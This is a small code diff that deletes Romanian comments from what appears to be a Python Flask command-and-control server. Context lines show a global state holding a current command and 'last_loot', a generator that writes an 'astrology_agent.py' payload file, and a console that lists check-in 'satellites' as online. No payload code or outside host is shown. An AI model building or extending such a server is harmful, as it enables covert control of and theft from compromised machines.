@@ -15,7 +15,7 @@ log.setLevel(logging.ERROR)
 
 app = Flask(__name__)
 
-# STAREA GLOBALĂ
+
 SERVER_STATE = {
     "command": "ECLIPSE",     
     "last_loot": None,        
@@ -117,7 +117,7 @@ if __name__ == '__main__':
         f.write(payload.strip())
     print("\033[92m[+] Agent generat: astrology_agent.py\033[0m")
 
-# --- CLI INTERFACE ---
+
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -150,7 +150,7 @@ def show_satellites():
     for node, last_seen in SERVER_STATE["nodes"].items():
         delta = int(current_time - last_seen)
         
-        # Daca a fost vazut in ultimele 15 secunde e considerat ONLINE
+        
         if delta < 15:
             status = "\033[92mONLINE (Stable)\033[0m"
             active_count += 1
